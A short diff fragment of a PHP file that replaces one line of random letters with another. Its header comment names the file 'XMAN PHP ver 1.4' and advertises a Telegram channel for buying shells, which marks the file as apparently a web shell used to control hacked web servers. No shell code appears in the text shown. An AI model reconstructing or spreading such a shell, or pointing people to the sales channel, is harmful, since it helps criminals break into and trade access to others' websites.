@@ -1,4 +1,4 @@
-﻿eaiovnaovbqoebvqoeavibavo
+aobvqovbqvoqvbqvoqbv
 <?pHp
 /* XMAN PHP ver 1.4 [ buy shells https://t.me/buyshell_molasazy ] */
 
